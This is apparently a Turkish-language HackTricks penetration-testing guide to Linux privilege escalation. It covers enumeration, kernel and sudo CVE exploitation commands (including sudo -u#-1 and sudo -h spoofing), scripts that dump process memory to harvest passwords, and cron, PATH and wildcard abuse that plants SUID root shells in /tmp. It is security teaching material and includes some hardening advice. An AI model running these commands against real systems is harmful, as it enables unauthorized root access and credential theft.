# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Daha kapsamlı bir arka plan ve geçmişte kullanılan enumeration iş akışları için references bölümünde listelenen g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation ve linux-private-i kaynaklarını karşılaştırın.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Sistem Bilgileri

### İşletim sistemi bilgisi

Çalışan işletim sistemi hakkında biraz bilgi edinmeye başlayalım.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

**PATH** değişkenindeki herhangi bir klasörde **yazma izniniz** varsa bazı kütüphaneleri veya ikili dosyaları hijack edebilirsiniz:

```bash
echo $PATH
```

### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını araştırın.

[Kernel/LPE/CVE bölümü](../../main-system-information/kernel-lpe-cves/README.md), yerel ayrıcalık yükseltme örneklerini ve Binary Exploitation bölümündeki ayrıntılı Linux kernel yazılarına bağlantıları içerir. Bir örnek olayı test etmeden önce etkilenen build'i ve yapılandırmayı doğrulayın.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

İyi bir güvenlik açığı bulunan kernel listesine ve önceden **derlenmiş exploit'lere** burada ulaşabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
**Derlenmiş exploit'ler** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu web sitesindeki tüm güvenlik açığı bulunan kernel sürümlerini çıkarmak için şunu yapabilirsiniz:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Kernel exploit'lerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim üzerinde çalıştırın, yalnızca kernel 2.x için exploit'leri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**; kernel sürümünüz bir kernel exploit'inde yazıyor olabilir. Böylece bu exploit'in geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Ayrıcalık Yükseltme - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo sürümü

Şurada listelenen savunmasız sudo sürümlerine göre:

```bash
searchsploit sudo
```

Bu grep ile sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 ile 1.9.17 arasındaki sürümlerde**, sudo `/etc/nsswitch.conf` dosyasını kullanıcının kontrolündeki bir dizinden yüklediğinde, ayrıcalıksız yerel kullanıcıların `--chroot` seçeneği aracılığıyla root yetkilerine yükselmesine izin verir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. İlgili yollardaki root-setuid sudo binary'lerinin tümünü kontrol edin; `sudo -V` yalnızca `PATH` tarafından seçilen binary'yi bildirir. Dağıtım paketleri, upstream sürüm dizesini değiştirmeden düzeltmeyi backport etmiş olabilir; bu nedenle satıcı paketinin durumunu da doğrulayın. [sudo maintainer'ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/3) bakın.<sup>[[28]](#references)[[29]](#references)</sup>

Bu [zafiyeti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) exploit etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) mevcut. Exploit'i çalıştırmadan önce `sudo` sürümünüzün zafiyetten etkilendiğinden ve `chroot` özelliğini desteklediğinden emin olun.  

Daha fazla bilgi için orijinal [zafiyet duyurusuna](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) bakın.<sup>[[28]](#references)</sup>

### Sudo host tabanlı kurallarını atlatma (CVE-2025-32462)

Upstream sudo **1.8.8 ile 1.9.17 arasındaki sürümlerde**, host tabanlı sudoers kurallarını **gerçek hostname** yerine `sudo -h <host>` komutunda belirtilen **kullanıcı tarafından sağlanan hostname** değerini kullanarak değerlendirebilir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. Kullanıcının, seçilen host üzerinde eşleşen bir sudoers girdisi yine de olmalıdır. Yerel politikanın yanı sıra satıcı backport'larını ve alternatif sudo binary'lerini de inceleyin. [sudo maintainer'ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/2) bakın.<sup>[[29]](#references)</sup>

Gereksinimler:
- Zafiyetten etkilenen sudo sürümü
- Host'a özgü sudoers kuralları (host, geçerli hostname veya `ALL` olmamalıdır)

Örnek sudoers kalıbı:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

İzin verilen host'u spoof ederek exploit et:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Seçilen adın çözümlenmesi engelleniyorsa, bu adın ana bilgisayarda nasıl çözümlendiğini doğrulayın. Bir adı günlükte veya yapılandırma dosyasında görmek, adın çözümlenebilir olduğu anlamına gelmez ve `/etc/hosts` dosyasını değiştirmek genellikle ayrıcalıklı yazma erişimi gerektirir.

#### sudo < v1.8.28

Bu [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287), `(ALL, !root) /bin/bash` gibi, root kullanıcısını hariç tutarken `ALL` kullanıcıları adına bir komuta izin veren etkin bir sudo kuralı gerektirir. Çağıran kullanıcının, varsa kimlik doğrulama gereksinimleri de dahil olmak üzere, bu kuralı kullanmasına da izin verilmelidir. Yüklü paketin güvenlik duyurusunu kontrol edin: Dağıtım sağlayıcıları düzeltmeyi, görüntülenen upstream sürüm hâlâ 1.8.28'in altında olsa bile, sürümlere geri taşıdı. Tek başına bir `!root` kuralı veya eski bir sürüm, sistemin savunmasız olduğunu doğrulamaz. Pasif keşif sırasında ayrıcalıklı bir komutu test etmeyin.

```
sudo -u#-1 /bin/bash
```

### Dmesg imza doğrulaması başarısız oldu

Bu açığın nasıl exploit edilebileceğine dair bir **örnek** için **HTB smasher2 makinesini** inceleyin.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Daha fazla sistem keşfi

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Olası savunmaları listeleyin

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Bir container içindeyseniz, aşağıdaki container-security bölümüyle başlayıp ardından runtime'a özgü abuse sayfalarına geçin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Sürücüler

**Nelerin mount edilmiş ve mount edilmemiş olduğunu**, nerede ve neden olduğunu kontrol edin. Mount edilmemiş bir şey varsa, mount edip özel bilgileri kontrol etmeyi deneyebilirsiniz.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Yararlı yazılımlar

Yararlı ikili dosyaları listeleyin

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ayrıca herhangi bir derleyicinin kurulu olup olmadığını kontrol edin. Bir kernel exploit kullanmanız gerekirse bu faydalıdır; exploit'i kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Kurulu Güvenlik Açığı Bulunan Yazılımlar

**Kurulu paketlerin ve hizmetlerin sürümünü** kontrol edin. Örneğin, yetki yükseltmek için kullanılabilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli kurulu yazılımların sürümünü manuel olarak kontrol etmeniz önerilir.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Makineye SSH erişiminiz varsa, makinede yüklü olan güncel olmayan ve savunmasız yazılımları kontrol etmek için **openVAS** da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğu işe yaramayacak çok fazla bilgi göstereceğini unutmayın. Bu nedenle, yüklü yazılım sürümlerinden herhangi birinin bilinen exploit’lere karşı savunmasız olup olmadığını kontrol eden OpenVAS veya benzeri uygulamaların kullanılması önerilir._

## Processes

**Hangi işlemlerin** çalıştırıldığına göz atın ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin, root tarafından çalıştırılan bir tomcat?).

```bash
ps aux
ps -ef
top -n 1
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz. **Linpeas**, süreçlerin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **süreçlerin binary dosyaları üzerindeki ayrıcalıklarınızı kontrol edin**; belki birinin dosyasının üzerine yazabilirsiniz.

### Farklı kullanıcılar arasındaki ebeveyn-çocuk süreç zincirleri

Ebeveyninden **farklı bir kullanıcı** altında çalışan bir alt süreç otomatik olarak kötü amaçlı değildir, ancak yararlı bir **triage sinyalidir**. Bazı geçişler beklenir (`root` kullanıcısının bir servis kullanıcısı başlatması, oturum yöneticilerinin oturum süreçleri oluşturması gibi); ancak olağandışı zincirler wrapper’ları, debug yardımcılarını, kalıcılığı veya zayıf runtime güven sınırlarını ortaya çıkarabilir.

Hızlı inceleme:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Beklenmedik bir zincir bulursanız üst süreç komut satırını ve davranışını etkileyen tüm dosyaları inceleyin (`config`, `EnvironmentFile`, yardımcı betikler, çalışma dizini, yazılabilir argümanlar). Gerçek privesc yollarının birkaçında alt süreç yazılabilir değildi; ancak **üst sürecin kontrolündeki config** veya yardımcı zincir yazılabilirdi.

### Silinmiş yürütülebilir dosyalar ve silinmiş-açık dosyalar

Çalışma zamanı kalıntılarına genellikle **silindikten sonra da** erişilebilir. Bu, hem yetki yükseltme hem de hassas dosyaları hâlâ açık tutan bir süreçten kanıt kurtarma açısından kullanışlıdır.

Silinmiş yürütülebilir dosyaları kontrol edin:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe`, `(deleted)` değerini gösteriyorsa süreç hâlâ bellekteki eski binary image'ı çalıştırıyordur. Bu, araştırılması gereken güçlü bir işarettir çünkü:

- kaldırılan executable ilginç string'ler veya kimlik bilgileri içerebilir
- çalışan süreç hâlâ yararlı file descriptor'lar sunabilir
- silinmiş bir privileged binary, yakın zamanda müdahale edildiğini veya temizleme girişiminde bulunulduğunu gösterebilir

Silinmiş ve açık dosyaları genel olarak toplayın:

```bash
lsof +L1
```

İlginç bir descriptor bulursanız, onu doğrudan geri alın:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Bu, özellikle bir süreç silinmiş bir gizli bilgiyi, betiği, veritabanı dışa aktarımını veya flag dosyasını hâlâ açık tutuyorsa çok değerlidir.

### Süreç izleme

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık sık çalıştırılan veya belirli gereksinimler karşılandığında çalıştırılan güvenlik açığı bulunan süreçleri belirlemek için çok yararlı olabilir.

#### sudo altında Linux ProcMon

[Linux için ProcMon](https://github.com/microsoft/ProcMon-for-Linux), seçili süreçleri ve sistem çağrılarını izleyip bir SQLite trace dosyasına kaydedebilir. `sudo -l` çıktısı, kısıtlanmamış ve root yetkileriyle çalışabilen bir `procmon` komutuna izin veriyorsa, bu komutun başka bir kullanıcının süreç girdilerini veya çıktılarını gözlemleyip gözlemleyemeyeceğini değerlendirin. Bu izin yalnızca inceleme için bir ipucudur: tracer desteği, etkin politika ve uygun bir sürecin etkinliği de önemlidir. Trace dosyaları gizli bilgiler içerebilir; bu nedenle yetkili dışa aktarımları dikkatle inceleyin ve ilgisiz süreçleri toplamaktan kaçının.

### Süreç belleği

Bazı sunucu hizmetleri **kimlik bilgilerini bellekte düz metin olarak saklar**.\
Normalde başka kullanıcılara ait süreçlerin belleğini okumak için **root yetkilerine** ihtiyacınız olur; bu nedenle bu yöntem genellikle zaten root olduğunuzda daha fazla kimlik bilgisi keşfetmek için kullanışlıdır.\
Ancak **normal bir kullanıcı olarak sahibi olduğunuz süreçlerin belleğini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu makinenin **ptrace kullanımına varsayılan olarak izin vermediğini** unutmayın; bu, ayrıcalıksız kullanıcınıza ait diğer süreçlerin dökümünü alamayacağınız anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini denetler:
>
> - **kernel.yama.ptrace_scope = 0**: Aynı uid değerine sahip olmaları koşuluyla tüm süreçlerde hata ayıklama yapılabilir. ptrace'in çalışma şekli geleneksel olarak böyleydi.
> - **kernel.yama.ptrace_scope = 1**: Yalnızca üst süreçte hata ayıklama yapılabilir.
> - **kernel.yama.ptrace_scope = 2**: Yalnızca yönetici ptrace kullanabilir; bunun için CAP_SYS_PTRACE capability gerekir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bu ayar etkinleştirildikten sonra ptrace'i yeniden etkinleştirmek için yeniden başlatma gerekir.

Parola kasasının kilidini kısa süreliğine açan, aynı UID'ye sahip bir süreç ayrı bir kimlik bilgisi sınırı oluşturabilir. İzlemeye izin verildiğinde etkin ve dökümlenebilir bir süreç, girdi sistem çağrıları veya belleği üzerinden kasa parolasını açığa çıkarabilir; bu sırada şifrelenmiş kasa dosyasının kendisi korumalı kalabilir. `ptrace_scope=0` tek başına yeterli değildir: eşleşen kimlik bilgileri, hedef sürecin dökümlenebilir olması, diğer Linux güvenlik modülleri ve sürecin çalışma süresi de önemlidir. Bir kasa girdisinin Unix root oturum açma bilgisi olarak kullanılabilmesi ayrıca kimlik bilgilerinin yeniden kullanımının kontrol edilmesini gerektirir. Rutin envanter çalışmaları girdileri yakalamak veya gizli bilgileri göstermek yerine politikayı ve aday süreç ya da kasa yollarını raporlamalıdır. [Çekirdeğin Yama belgelerine](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) ve [ptrace erişim denetimlerine](https://man7.org/linux/man-pages/man2/ptrace.2.html) bakın.

#### GDB

Örneğin bir FTP hizmetinin belleğine erişiminiz varsa, Heap'i alıp içinde kimlik bilgilerini arayabilirsiniz.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için **maps, belleğin o sürecin sanal adres alanında nasıl eşlendiğini** gösterir; ayrıca **eşlenen her bölgenin izinlerini** de gösterir. **mem** sözde dosyası, **sürecin belleğini doğrudan sunar**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların ofsetlerini öğreniriz. Bu bilgileri kullanarak **mem dosyasında ilgili konumlara gider ve okunabilir tüm bölgeleri bir dosyaya dökeriz**.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem`, sistemin **fiziksel** belleğine, sanal belleğe değil, erişim sağlar. Kernel'ın sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle `/dev/mem` yalnızca **root** ve **kmem** grubuna okunabilir.

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux için ProcDump

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış hâlidir. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Araçlar

Bir sürecin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait olan süreci dökebilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) içindeki Script A.5 (root gerekir)

### Süreç Belleğinden Kimlik Bilgileri

#### Manuel örnek

Authenticator sürecinin çalıştığını tespit ederseniz:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Process'i dump edebilir (bir process'in belleğini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve belleğin içinde kimlik bilgilerini arayabilirsiniz:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) aracı **bellekten** ve bazı **iyi bilinen dosyalardan** düz metin kimlik bilgilerini **çalacaktır**. Düzgün çalışması için root ayrıcalıkları gerekir.

| Özellik                                           | İşlem Adı           |
| ------------------------------------------------- | ------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password        |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm             |
| VSFTPd (Etkin FTP Bağlantıları)                   | vsftpd              |
| Apache2 (Etkin HTTP Basic Auth Oturumları)         | apache2             |
| OpenSSH (Etkin SSH Oturumları - Sudo Kullanımı)   | sshd:               |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) root olarak çalışıyor – web tabanlı scheduler privesc

Web tabanlı bir “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyorsa ve yalnızca loopback’e bağlanmışsa, SSH local port-forwarding üzerinden yine de erişip ayrıcalıklı bir iş oluşturarak yetki yükseltebilirsiniz.<sup>[[1]](#references)[[4]](#references)</sup>

Tipik zincir
- Yalnızca loopback’e bağlı portu (örn. 127.0.0.1:8000) ve Basic-Auth realm’ini `ss -ntlp` / `curl -v localhost:8000` ile bulun
- Operasyonel dosyalarda kimlik bilgilerini arayın:
  - `zip -P <password>` içeren yedekler/script’ler
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkaran systemd unit’leri
- Tünel oluşturup oturum açın:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir görev oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```

Sıkılaştırma
- Crontab UI'ı root olarak çalıştırmayın; özel bir kullanıcı kullanın ve izinleri en aza indirin
- localhost'a bağlayın ve erişimi ayrıca firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- Unit dosyalarına gizli bilgileri gömmekten kaçının; secret store veya yalnızca root'un erişebildiği EnvironmentFile kullanın
- İsteğe bağlı job çalıştırmaları için audit/logging'i etkinleştirin

Zamanlanmış job'lardan herhangi birinin savunmasız olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten yararlanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? Symlink kullanabilir misiniz? root'un kullandığı dizinde belirli dosyalar oluşturabilir misiniz?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` kullanılıyorsa, hangi adların gerçekten çalıştırılacağını kontrol edin:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Bu, yanlış pozitifleri önler. Yazılabilir bir periyodik dizin, yalnızca payload dosya adınız yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma izinlerine sahip olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı yolu belirtmeden bir komut veya betik çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Şunu kullanarak root shell alabilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron using a script with a wildcard (Wildcard Injection)

Root tarafından çalıştırılan bir script'in içinde bir komutta “**\***” varsa, beklenmedik şeyler (privesc gibi) yapmak için bundan yararlanabilirsiniz. Örnek:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Wildcard'ın önünde** _**/some/path/\***_ **gibi bir path varsa, savunmasız değildir (hatta** _**./\***_ **de savunmasız değildir).**

Wildcard exploitation için diğer püf noktalarını aşağıdaki sayfada bulabilirsiniz:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser'larında Bash arithmetic expansion injection

Bash arithmetic, güvenilmeyen metni bir ifade olarak yorumlayabilir. Etkilenen Bash bağlamlarında, bu ifadedeki bir array subscript, command substitution değerlendirebilir. Ayrıcalıklı bir cron/parser, saldırganın kontrolündeki log metnini böyle bir aritmetik karşılaştırmada kullanırsa substitution, parser'ın kimliğiyle çalışabilir.<sup>[[22]](#references)</sup> Bu, kullanılan Bash ifadesine ve sürümüne bağlıdır; genişletilmiş bir değişkendeki yalın `$(...)0` dizgesi, kendi başına yeniden değerlendirme için güvenilir bir örnek değildir.

Girdi, dosya metadata'sından veya kullanıcı tarafından yazılabilir bir konumdan okunan başka bir alandan da gelebilir. Örneğin, bir image `Producer` tag'ini okuyup `[[ "$producer" -eq "expected" ]]` ile karşılaştıran ayrıcalıklı bir cleanup script'i, değişken tırnak içinde olsa bile aritmetik karşılaştırma yapar. Zamanlanmış işlemin hangi kimlikle çalıştığını, bu tag'i hangi dosyaların sağlayabileceğini, karşılaştırmadan önceki dönüşümleri ve Bash'in tam olarak nasıl davrandığını inceleyin. Metin etiketleri için string comparison kullanın; sayılar için aritmetik işlem yapmadan önce girdinin yalnızca ondalık rakamlardan oluştuğunu doğrulayın. Bkz. [Bash arithmetic kuralları](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Tipik savunmasız örüntü:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Dizi alt indisi mekanizması için güvenli yerel davranış testi (ayrıcalıklı işlem veya dosya değişikliği olmadan):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Zamanlanmış betiğin kendisini ve açtığı literal giriş yolunu izleyin. Log dosyasının kendisi yazılabilir olmasa bile, sticky bit ayarlanmamış üst dizinine yazma ve dizinde gezinme izni olan bir kullanıcı, dizin girdisini değiştirebilir; bu izinleri ayırt etmek için `namei -l` yardımcı olur. Farklı bir yazılabilir log yolu, okunamayan bir zamanlayıcı veya bu alanı Bash aritmetiği olarak hiç değerlendirmeyen bir parser, bu yöntemin mümkün olduğunu göstermez.

### Cron betiğinin üzerine yazılması ve symlink

Root tarafından çalıştırılan bir cron betiğini **değiştirebiliyorsanız**, çok kolay bir şekilde shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Root tarafından çalıştırılan script, **tam erişiminizin olduğu bir dizini** kullanıyorsa, bu klasörü silip **başka bir dizine sembolik bağlantı** oluşturarak sizin kontrol ettiğiniz bir scripti çalıştırmasını sağlamak işe yarayabilir.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink doğrulaması ve daha güvenli dosya işleme

Dosyaları yola göre okuyup yazan ayrıcalıklı betikleri/ikili dosyaları incelerken bağlantıların nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i izler ve hedefin meta verilerini döndürür.
- `lstat()` bağlantının kendisinin meta verilerini döndürür.
- `readlink -f` ve `namei -l`, son hedefi çözümlemeye ve yolun her bileşeninin izinlerini göstermeye yardımcı olur.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Savunmacılar/geliştiriciler için symlink hilelerine karşı daha güvenli kalıplar şunlardır:

- `O_EXCL` ile `O_CREAT`: yol zaten varsa işlemi başarısız kılar (saldırganın önceden oluşturduğu bağlantıları/dosyaları engeller).
